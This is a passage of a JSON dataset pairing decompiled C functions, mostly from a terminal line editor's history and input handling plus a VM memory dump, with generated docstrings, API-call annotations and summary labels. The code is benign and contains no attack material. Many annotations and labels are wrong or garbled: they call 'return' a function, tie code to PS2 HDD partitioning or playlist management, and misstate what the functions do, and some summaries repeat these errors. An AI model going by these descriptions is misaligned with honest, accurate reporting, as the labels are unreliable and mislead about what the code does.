            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_clear_line` function appears to be a part of a renderer or terminal interface implementation, responsible for clearing a specific line or lines of text or rendering buffer data, ensuring that the area is ready for new content or updates.",
            "The `os_memc` function seems to be a custom memory comparison function, likely designed for embedded systems, to compare memory blocks using `os_memcmp` (which itself is a macro defined as `memcmp` in the provided code snippets), as shown in the snippet where it's used to compare BSSIDs in a Wi-Fi testing framework.",
            "The \"return\" function is used in C programming to specify the value to be returned from a function or to terminate the function and return control to the calling code.",
            "The `_redraw` function appears to be responsible for updating or redrawing elements such as labels, buttons, or terminal colors within a graphical user interface or terminal interface, likely in a C programming context."
        ],
        "longer_label": "The `history_use` function clears a line, copies history data, and redraws the edited content in a terminal or rendering interface."
    },
    {
        "id": 29,
        "docstring_tokens": [
            "The",
            "code",
            "implements",
            "a",
            "function",
            "that",
            "allows",
            "to",
            "navigate",
            "through",
            "a",
            "list",
            "of",
            "edit",
            "history",
            "entries",
            "by",
            "moving",
            "to",
            "the",
            "previous",
            "entry",
            "and",
            "updating",
            "the",
            "current",
            "position",
            "accordingly",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "__int64",
            "v0",
            ";",
            "__int64",
            "v1",
            ";",
            "LODWORD",
            "(",
            "v0",
            ")",
            "=",
            "history_curr",
            ";",
            "if",
            "(",
            "history_curr",
            ")",
            "{",
            "if",
            "(",
            "dl_list_empty",
            "(",
            "&",
            "history_list",
            ")",
            ")",
            "v1",
            "=",
            "0L",
            "L",
            ";",
            "else",
            "v1",
            "=",
            "history_list",
            ";",
            "if",
            "(",
            "v1",
            "!",
            "=",
            "history_curr",
            "|",
            "|",
            "currbuf_valid",
            ")",
            "{",
            "if",
            "(",
            "dl_list_empty",
            "(",
            "&",
            "history_list",
            ")",
            ")",
            "v0",
            "=",
            "0L",
            "L",
            ";",
            "else",
            "v0",
            "=",
            "qword_4498",
            ";",
            "if",
            "(",
            "v0",
            "!",
            "=",
            "history_curr",
            ")",
            "{",
            "history_curr",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "history_curr",
            ";",
            "LODWORD",
            "(",
            "v0",
            ")",
            "=",
            "history_use",
            "(",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "cmdbuf",
            "[",
            "cmdbuf_len",
            "]",
            "=",
            "0",
            ";",
            "os_memcpy",
            "(",
            "&",
            "currbuf",
            ",",
            "cmdbuf",
            ",",
            "cmdbuf_len",
            "+",
            "1",
            ")",
            ";",
            "currbuf_valid",
            "=",
            "1",
            ";",
            "LODWORD",
            "(",
            "v0",
            ")",
            "=",
            "history_use",
            "(",
            ")",
            ";",
            "}",
            "}",
            "return",
            "v0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"os_memcpy\" is likely designed to copy a specified number of bytes from a source memory location to a destination memory location, ensuring safety by specifying the size of the destination buffer, hence guarding against buffer overflows."
        ],
        "longer_label": "The `history_prev` function likely manages a history mechanism, potentially for a command-line interface, where it checks if there is a previous history item, copies it to a current buffer if valid, and returns the result of history usage."
    },
    {
        "id": 30,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "moves",
            "to",
            "the",
            "next",
            "item",
            "in",
            "a",
            "history",
            "list",
            "and",
            "updates",
            "the",
            "current",
            "buffer",
            "if",
            "necessary",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "__int64",
            "v0",
            ";",
            "int",
            "result",
            ";",
            "if",
            "(",
            "history_curr",
            "&",
            "&",
            "(",
            "dl_list_empty",
            "(",
            "&",
            "history_list",
            ")",
            "?",
            "(",
            "v0",
            "=",
            "0L",
            "L",
            ")",
            ":",
            "(",
            "v0",
            "=",
            "history_list",
            ")",
            ",",
            "v0",
            "!",
            "=",
            "history_curr",
            ")",
            ")",
            "{",
            "history_curr",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "history_curr",
            "+",
            "8",
            ")",
            ";",
            "return",
            "history_use",
            "(",
            ")",
            ";",
            "}",
            "else",
            "{",
            "result",
            "=",
            "currbuf_valid",
            ";",
            "if",
            "(",
            "currbuf_valid",
            ")",
            "{",
            "currbuf_valid",
            "=",
            "0",
            ";",
            "edit_clear_line",
            "(",
            ")",
            ";",
            "cmdbuf_pos",
            "=",
            "os_strlen",
            "(",
            "&",
            "currbuf",
            ")",
            ";",
            "cmdbuf_len",
            "=",
            "cmdbuf_pos",
            ";",
            "os_memcpy",
            "(",
            "cmdbuf",
            ",",
            "&",
            "currbuf",
            ",",
            "cmdbuf_pos",
            ")",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_list` function appears to be part of a larger codebase, possibly related to playlist management or some form of data structuring, as it includes declarations for playlists, tracks, and windows, along with operations like iterating over instructions and calculating the number of operands for a specific instruction.",
            "The function `empty()` is used in different contexts: in the first snippet, it checks if a stack is empty; in the second, it checks if a linked list is empty; and in the third, it's likely part of a macro expansion for error code definitions, possibly indicating if a condition is empty or not.",
            "The os_memc function is used for memory operations such as memory allocation, copying, setting, and string comparisons in an embedded system, specifically for the ESP8266 platform.",
            "The function named \"return\" seems to be a misnomer, as it appears to contain unrelated code snippets, including a struct definition, a function for calculating the signed distance field (SDF) of a capsule shape in a ray marching renderer, initialization of an interception context for device interception, and a simple C program printing \"Hello World\", suggesting a potential collection of code fragments rather than a coherent function."
        ],
        "longer_label": "The provided code snippet appears to be a function named `history_next()` designed to navigate through a history list, either by advancing to the next item if it exists or by restoring the previous editing state if the history list is empty or if the current buffer is valid, with annotations indicating its likely context within a larger codebase involving playlist management or data structuring, possibly for an embedded system using the ESP8266 platform."
    },
    {
        "id": 31,
        "docstring_tokens": [
            "The",
            "function",
            "writes",
            "the",
            "edit",
            "history",
            "to",
            "a",
            "file",
            "given",
            "a",
            "filename",
            "and",
            "a",
            "filter",
            "callback",
            "function",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "unsigned",
            "int",
            "(",
            "__fastcall",
            "*",
            "a2",
            ")",
            "(",
            "__int64",
            ",",
            "__int64",
            ")",
            ")",
            "{",
            "FILE",
            "*",
            "v2",
            ";",
            "__int64",
            "i",
            ";",
            "FILE",
            "*",
            "stream",
            ";",
            "v2",
            "=",
            "fopen",
            "(",
            "a1",
            ",",
            "\"w\"",
            ")",
            ";",
            "stream",
            "=",
            "v2",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "qword_4498",
            ";",
            "(",
            "__int64",
            "*",
            ")",
            "i",
            "!",
            "=",
            "&",
            "history_list",
            ";",
            "i",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "8",
            ")",
            ")",
            "{",
            "if",
            "(",
            "!",
            "a2",
            "|",
            "|",
            "!",
            "a2",
            "(",
            "edit_cb_ctx",
            ",",
            "i",
            "+",
            "16",
            ")",
            ")",
            "fprintf",
            "(",
            "stream",
            ",",
            "\"%s\\n\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "i",
            "+",
            "16",
            ")",
            ")",
            ";",
            "}",
            "LODWORD",
            "(",
            "v2",
            ")",
            "=",
            "fclose",
            "(",
            "stream",
            ")",
            ";",
            "}",
            "return",
            "(",
            "int",
            ")",
            "v2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function, likely redefined in the given snippets, is utilized to format and print output, potentially specialized for a specific environment or purpose such as an RPN calculator or handling different platforms' printf result codes.",
            ""
        ],
        "longer_label": "The code utilizes a specialized `printf` function to write history data to a file, while also using a callback function to determine whether certain data should be included in the output."
    },
    {
        "id": 32,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "called",
            "history_debug_dump",
            "that",
            "clears",
            "the",
            "edit",
            "history",
            "line",
            ",",
            "prints",
            "the",
            "edit",
            "history",
            "in",
            "reverse",
            "order",
            "with",
            "``",
            "[",
            "C",
            "]",
            "''",
            "next",
            "to",
            "the",
            "current",
            "history",
            "entry",
            ",",
            "prints",
            "the",
            "current",
            "buffer",
            "if",
            "valid",
            ",",
            "and",
            "then",
            "redraws",
            "the",
            "edit",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v0",
            ";",
            "__int64",
            "i",
            ";",
            "edit_clear_line",
            "(",
            ")",
            ";",
            "putchar",
            "(",
            "13",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "qword_4498",
            ";",
            "(",
            "__int64",
            "*",
            ")",
            "i",
            "!",
            "=",
            "&",
            "history_list",
            ";",
            "i",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "8",
            ")",
            ")",
            "{",
            "if",
            "(",
            "i",
            "=",
            "=",
            "history_curr",
            ")",
            "v0",
            "=",
            "\"[C]\"",
            ";",
            "else",
            "v0",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "&",
            "unk_459C",
            ";",
            "printf",
            "(",
            "\"%s%s\\n\"",
            ",",
            "v0",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "i",
            "+",
            "16",
            ")",
            ")",
            ";",
            "}",
            "if",
            "(",
            "currbuf_valid",
            ")",
            "printf",
            "(",
            "\"{%s}\\n\"",
            ",",
            "&",
            "currbuf",
            ")",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"edit_clear_lineputchar\" likely clears or edits a line in a text-based interface by outputting characters, such as spaces or control characters, to overwrite existing content on the line.",
            "The \"return\" function in C programming is used to return a value from a function and terminate its execution, and can be used in conjunction with various types of code, such as returning a struct, creating a context, or running a basic program.",
            "The `_redraw` function appears to be part of a larger program, likely a terminal-based application or user interface framework, responsible for redrawing components such as buttons or tracks, using the provided code snippets for handling various aspects like window manipulation, color handling, and text rendering."
        ],
        "longer_label": "The history_debug_dump function clears a line, outputs history information with annotations, and then redraws the edited content in a text-based interface."
    },
    {
        "id": 33,
        "docstring_tokens": [
            "The",
            "code",
            "inserts",
            "a",
            "character",
            "into",
            "a",
            "buffer",
            ",",
            "updating",
            "the",
            "buffer",
            "'s",
            "length",
            "and",
            "position",
            ",",
            "while",
            "also",
            "displaying",
            "the",
            "character",
            "and",
            "redrawing",
            "the",
            "buffer",
            "if",
            "necessary",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "a1",
            ")",
            "{",
            "int",
            "result",
            ";",
            "int",
            "v2",
            ";",
            "int",
            "v3",
            ";",
            "result",
            "=",
            "cmdbuf_len",
            ";",
            "if",
            "(",
            "cmdbuf_len",
            "<",
            "=",
            "4094",
            ")",
            "{",
            "if",
            "(",
            "cmdbuf_len",
            "=",
            "=",
            "cmdbuf_pos",
            ")",
            "{",
            "v2",
            "=",
            "cmdbuf_pos",
            "+",
            "+",
            ";",
            "cmdbuf",
            "[",
            "v2",
            "]",
            "=",
            "a1",
            ";",
            "+",
            "+",
            "cmdbuf_len",
            ";",
            "putchar",
            "(",
            "a1",
            ")",
            ";",
            "return",
            "fflush",
            "(",
            "stdout",
            ")",
            ";",
            "}",
            "else",
            "{",
            "os_memmove",
            "(",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "+",
            "1",
            "]",
            ",",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "]",
            ",",
            "cmdbuf_len",
            "-",
            "cmdbuf_pos",
            ")",
            ";",
            "v3",
            "=",
            "cmdbuf_pos",
            "+",
            "+",
            ";",
            "cmdbuf",
            "[",
            "v3",
            "]",
            "=",
            "a1",
            ";",
            "+",
            "+",
            "cmdbuf_len",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"return\" function is used to terminate the execution of a function and return a value to the calling function or program."
        ],
        "longer_label": "The provided code is an implementation of a function named insert_char that inserts a character into a buffer, updates its length, and either prints the character or redraws the buffer depending on its position within the buffer limits, with the annotations explaining the purpose of the \"return\" statement."
    },
    {
        "id": 34,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "process_cmd",
            "`",
            "resets",
            "the",
            "current",
            "buffer",
            ",",
            "adds",
            "the",
            "command",
            "to",
            "history",
            ",",
            "resets",
            "the",
            "command",
            "position",
            "and",
            "length",
            ",",
            "edits",
            "the",
            "command",
            "callback",
            ",",
            "and",
            "flushes",
            "the",
            "standard",
            "output",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "currbuf_valid",
            "=",
            "0",
            ";",
            "if",
            "(",
            "cmdbuf_len",
            ")",
            "{",
            "cmdbuf",
            "[",
            "cmdbuf_len",
            "]",
            "=",
            "0",
            ";",
            "history_add",
            "(",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "cmdbuf",
            ")",
            ";",
            "cmdbuf_pos",
            "=",
            "0",
            ";",
            "cmdbuf_len",
            "=",
            "0",
            ";",
            "edit_cmd_cb",
            "(",
            "edit_cb_ctx",
            ",",
            "cmdbuf",
            ")",
            ";",
            "}",
            "return",
            "fflush",
            "(",
            "stdout",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `history` function seems to be associated with tracking file system history, possibly for detecting data corruptions and handling multithreaded IO operations, with a focus on device and inode identification and potentially integration with caching products."
        ],
        "longer_label": "The provided code appears to be a function `process_cmd` that resets a buffer, adds a command to a history, resets command buffer parameters, executes a callback function with the command, and returns the output buffer's status after flushing, while the associated annotations suggest a potential focus on file system history tracking and integration with caching products."
    },
    {
        "id": 35,
        "docstring_tokens": [
            "This",
            "function",
            "prints",
            "the",
            "memory",
            "contents",
            "of",
            "a",
            "virtual",
            "machine",
            ",",
            "including",
            "the",
            "memory",
            "addresses",
            "and",
            "corresponding",
            "values",
            ",",
            "as",
            "well",
            "as",
            "the",
            "owner",
            "map",
            "showing",
            "ownership",
            "of",
            "memory",
            "locations",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "t_vm",
            "*",
            "vm",
            ")",
            "{",
            "char",
            "v1",
            ";",
            "char",
            "v2",
            ";",
            "int",
            "i",
            ";",
            "int",
            "ia",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "4095",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "!",
            "(",
            "i",
            "%",
            "0x40u",
            ")",
            ")",
            "{",
            "if",
            "(",
            "i",
            ")",
            "(",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "__int64",
            ")",
            ")",
            "putchar",
            ")",
            "(",
            "10L",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"%#06x : \"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "i",
            ")",
            ";",
            "}",
            "v1",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "vm",
            "-",
            ">",
            "memory",
            "[",
            "i",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v1",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "i",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "vm",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v1",
            ")",
            "_asan_report_load1",
            "(",
            "&",
            "vm",
            "-",
            ">",
            "memory",
            "[",
            "i",
            "]",
            ")",
            ";",
            "h_puthex",
            "(",
            "vm",
            "-",
            ">",
            "memory",
            "[",
            "i",
            "]",
            ")",
            ";",
            "(",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "__int64",
            ")",
            ")",
            "putchar",
            ")",
            "(",
            "32L",
            "L",
            ")",
            ";",
            "}",
            "puts",
            "(",
            "\"\\nOWNER MAP: \"",
            ")",
            ";",
            "for",
            "(",
            "ia",
            "=",
            "0",
            ";",
            "ia",
            "<",
            "=",
            "4095",
            ";",
            "+",
            "+",
            "ia",
            ")",
            "{",
            "if",
            "(",
            "!",
            "(",
            "ia",
            "%",
            "0x40u",
            ")",
            ")",
            "{",
            "if",
            "(",
            "ia",
            ")",
            "(",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "__int64",
            ")",
            ")",
            "putchar",
            ")",
            "(",
            "10L",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"%#06x : \"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "ia",
            ")",
            ";",
            "}",
            "v2",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "vm",
            "-",
            ">",
            "owner",
            "[",
            "ia",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v2",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "ia",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "vm",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v2",
            ")",
            "_asan_report_load1",
            "(",
            "&",
            "vm",
            "-",
            ">",
            "owner",
            "[",
            "ia",
            "]",
            ")",
            ";",
            "if",
            "(",
            "vm",
            "-",
            ">",
            "owner",
            "[",
            "ia",
            "]",
            "=",
            "=",
            "7",
            ")",
            "printf",
            "(",
            "\"__\"",
            ")",
            ";",
            "else",
            "printf",
            "(",
            "\"%02d\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "vm",
            "-",
            ">",
            "owner",
            "[",
            "ia",
            "]",
            ")",
            ";",
            "(",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "__int64",
            ")",
            ")",
            "putchar",
            ")",
            "(",
            "32L",
            "L",
            ")",
            ";",
            "}",
            "(",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "__int64",
            ")",
            ")",
            "putchar",
            ")",
            "(",
            "10L",
            "L",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `asan_report_load` appears to be part of AddressSanitizer (ASan), likely used for reporting memory loads in C code to detect memory access errors such as buffer overflows or use-after-free bugs, facilitating debugging and ensuring memory safety.",
            "The function \"h_puthex\" is designed to print a given unsigned char as a hexadecimal value in two characters.",
            "The printf function is used to display formatted output to the standard output, typically the console or terminal."
        ],
        "longer_label": "The provided code iterates through memory regions of a virtual machine, printing hexadecimal values and checking for memory access errors using AddressSanitizer (ASan), while also displaying owner information for each memory address."
    },
    {
        "id": 36,
        "docstring_tokens": [
            "The",
            "function",
            "``",
            "free_completions",
            "''",
            "frees",
            "the",
            "memory",
            "allocated",
            "for",
            "an",
            "array",
            "of",
            "strings",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "int",
            "i",
            ";",
            "if",
            "(",
            "a1",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "i",
            "+",
            "a1",
            ")",
            ";",
            "+",
            "+",
            "i",
            ")",
            "os_free",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "i",
            "+",
            "a1",
            ")",
            ")",
            ";",
            "return",
            "os_free",
            "(",
            "a1",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `os_free` is intended to deallocate memory previously allocated by functions like `os_malloc`, `os_calloc`, `os_realloc`, or `os_readfile`, preventing memory leaks and freeing resources.",
            "The `_free` function appears to be a custom memory deallocation function defined within a larger application, possibly used to manage memory allocation and deallocation in a specialized or platform-specific manner, as indicated by the code snippets that include definitions for memory allocation functions like `_malloc` and redefinitions for standard memory allocation functions like `malloc` and `free`."
        ],
        "longer_label": "The `free_completions` function utilizes a custom `os_free` function to deallocate memory previously allocated by specialized memory allocation functions, ensuring proper resource management and preventing memory leaks."
    },
    {
        "id": 37,
        "docstring_tokens": [
            "The",
            "code",
            "filters",
            "an",
            "array",
            "of",
            "strings",
            "by",
            "comparing",
            "them",
            "to",
            "a",
            "given",
            "string",
            ",",
            "removing",
            "any",
            "matches",
            "and",
            "freeing",
            "memory",
            "for",
            "non-matching",
            "strings",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "unsigned",
            "int",
            "v5",
            ";",
            "int",
            "i",
            ";",
            "v5",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "i",
            "+",
            "a1",
            ")",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "os_strncasecmp",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "i",
            "+",
            "a1",
            ")",
            ",",
            "a2",
            ",",
            "a3",
            ")",
            ")",
            "{",
            "os_free",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "i",
            "+",
            "a1",
            ")",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "i",
            "+",
            "a1",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "v5",
            "!",
            "=",
            "i",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "(",
            "int",
            ")",
            "v5",
            "+",
            "a1",
            ")",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "i",
            "+",
            "a1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "i",
            "+",
            "a1",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "+",
            "+",
            "v5",
            ";",
            "}",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "(",
            "int",
            ")",
            "v5",
            "+",
            "a1",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "return",
            "v5",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_strn_edup` function appears to be a memory allocation function that duplicates a given string up to a specified length, similar to `strndup`, but also handles logging errors if memory allocation fails.",
            "The function \"os_free\" is used to deallocate memory that was previously allocated using the \"os_malloc\", \"os_calloc\", \"os_realloc\", or \"os_readfile\" functions, ensuring proper memory management in the system."
        ],
        "longer_label": "The provided code defines a function called `filter_strings` that iterates over an array of strings pointed to by `a1`, comparing each string with `a2` up to a length of `a3`, deallocating and filtering out strings that do not match while moving matching strings to the beginning of the array, and finally returning the number of filtered strings."
    },
    {
        "id": 38,
        "docstring_tokens": [
            "The",
            "code",
            "finds",
            "the",
            "maximum",
            "common",
            "length",
            "between",
            "a",
            "string",
            "and",
            "multiple",
            "strings",
            "in",
            "a",
            "char",
            "array",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "*",
            "a1",
            ")",
            "{",
            "unsigned",
            "int",
            "v2",
            ";",
            "int",
            "i",
            ";",
            "int",
            "v4",
            ";",
            "v2",
            "=",
            "os_strlen",
            "(",
            "*",
            "a1",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "1",
            ";",
            "a1",
            "[",
            "i",
            "]",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v4",
            "=",
            "common_len",
            "(",
            "*",
            "a1",
            ",",
            "a1",
            "[",
            "i",
            "]",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "<",
            "(",
            "int",
            ")",
            "v2",
            ")",
            "v2",
            "=",
            "v4",
            ";",
            "}",
            "return",
            "v2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `_common` likely serves as a utility function within a larger system for initializing and managing partitions on a PS2 HDD, including creating a PFS filesystem, formatting partitions, and initializing the HDD with APA partitioning.",
            "The function \"length\" appears to be implemented across multiple code snippets and contexts, indicating its use in different programs or modules, likely to calculate the length of various data structures such as lists or arrays.",
            "The function `os_strlen` calculates the length of a given null-terminated string in C, returning the number of characters in the string excluding the null terminator.",
            "The \"common\" function appears to be a header file containing common definitions and constants used across multiple source files in a software project."
        ],
        "longer_label": "The code is a function that calculates the maximum common length of strings in an array using an external `common_len` function, with `os_strlen` used to determine the length of the initial string, likely within a larger system for managing partitions on a PS2 HDD."
    },
    {
        "id": 39,
        "docstring_tokens": [
            "The",
            "function",
            "returns",
            "a",
            "key",
            "code",
            "based",
            "on",
            "the",
            "input",
            "character",
            ",",
            "with",
            "'",
            "A",
            "'",
            "mapped",
            "to",
            "EDIT_KEY_UP",
            ",",
            "'",
            "B",
            "'",
            "mapped",
            "to",
            "EDIT_KEY_DOWN",
            ",",
            "'",
            "C",
            "'",
            "mapped",
            "to",
            "EDIT_KEY_RIGHT",
            ",",
            "'D",
            "'",
            "mapped",
            "to",
            "EDIT_KEY_LEFT",
            ",",
            "and",
            "all",
            "other",
            "characters",
            "mapped",
            "to",
            "EDIT_KEY_NONE",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "68",
            ")",
            "return",
            "261L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "68",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "67",
            ")",
            "return",
            "260L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "67",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "65",
            ")",
            "return",
            "258L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "66",
            ")",
            "return",
            "259L",
            "L",
            ";",
            "}",
            "}",
            "return",
            "256L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "This function, \"seq_to_key1\", appears to be related to converting escape sequences to key codes for a specific type of editing functionality, likely for a text editor or command line interface."
        ],
        "longer_label": "The code is a function that converts escape sequences to key codes for a specific type of editing functionality, likely for a text editor or command line interface."
    },
    {
        "id": 40,
        "docstring_tokens": [
            "The",
            "function",
            "esc_seq_to_key1_shift",
            "maps",
            "the",
            "character",
            "input",
            "to",
            "a",
            "corresponding",
            "key",
            "code",
            "for",
            "shift",
            "with",
            "arrow",
            "keys",
            ",",
            "returning",
            "EDIT_KEY_SHIFT_UP",
            "for",
            "'",
            "A",
            "'",
            ",",
            "EDIT_KEY_SHIFT_DOWN",
            "for",
            "'",
            "B",
            "'",
            ",",
            "EDIT_KEY_SHIFT_RIGHT",
            "for",
            "'",
            "C",
            "'",
            ",",
            "EDIT_KEY_SHIFT_LEFT",
            "for",
            "'D",
            "'",
            ",",
            "and",
            "EDIT_KEY_NONE",
            "for",
            "all",
            "other",
            "characters",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "68",
            ")",
            "return",
            "311L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "68",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "67",
            ")",
            "return",
            "310L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "67",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "65",
            ")",
            "return",
            "308L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "66",
            ")",
            "return",
            "309L",
            "L",
            ";",
            "}",
            "}",
            "return",
            "256L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
